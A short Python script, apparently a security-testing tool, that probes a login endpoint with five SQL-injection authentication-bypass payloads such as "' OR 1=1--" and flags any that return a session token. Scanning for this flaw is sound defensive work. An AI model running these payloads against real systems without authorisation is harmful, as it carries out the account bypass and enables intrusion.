#!/usr/bin/env python3
"""sqli-probe — deterministic SQL-injection auth-bypass detector.

The signal: a login that SUCCEEDS (returns an authenticated session token) when the username/
email field is a SQL-injection payload and the password is wrong. A non-vulnerable login rejects
these with a 401. This catches the classic `' OR 1=1--` authentication bypass.

Precision guard: a 200 that does NOT contain a session token does not count — only an actual
authenticated session proves the bypass."""
from __future__ import annotations
import argparse
import json

SQLI_PAYLOADS = [
    "' OR 1=1--", "' OR '1'='1'--", "' OR true--", "admin'--", "') OR ('1'='1",
]


def detect_sqli_auth_bypass(login_url, http_post, payloads=None,
                            token_path=("authentication", "token")):
    """http_post(url, json_body) -> (status:int, body:str). Returns hits [{payload, status}] for
    payloads that yielded an authenticated session."""
    hits = []
    for payload in (payloads or SQLI_PAYLOADS):
        try:
            status, body = http_post(login_url, {"email": payload, "password": "wrong-pw-xyz"})
        except Exception:
            continue
        if status != 200:
            continue
        try:
            data = json.loads(body)
            tok = data
            for key in token_path:
                tok = tok[key]
            if str(tok).strip():
                hits.append({"payload": payload, "status": status})
        except Exception:
            continue
    return hits


def _urllib_post(url, json_body):
    import urllib.request
    data = json.dumps(json_body).encode()
    req = urllib.request.Request(url, data=data, method="POST",
                                 headers={"Content-Type": "application/json"})
    try:
        r = urllib.request.urlopen(req, timeout=8)
        return r.status, r.read(65536).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception:
        return 0, ""


def main(argv=None, http_post=None) -> int:
    ap = argparse.ArgumentParser(prog="sqli-probe", description="SQL-injection auth-bypass probe")
    ap.add_argument("--url", required=True, help="base URL")
    ap.add_argument("--login-path", default="/rest/user/login")
    a = ap.parse_args(argv)
    login_url = a.url.rstrip("/") + a.login_path
    hits = detect_sqli_auth_bypass(login_url, http_post or _urllib_post)
    print(f"sqli-probe {login_url} — {len(hits)} finding(s)")
    for h in hits:
        print(f"SQLI {login_url} {h['payload']} authentication bypass")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
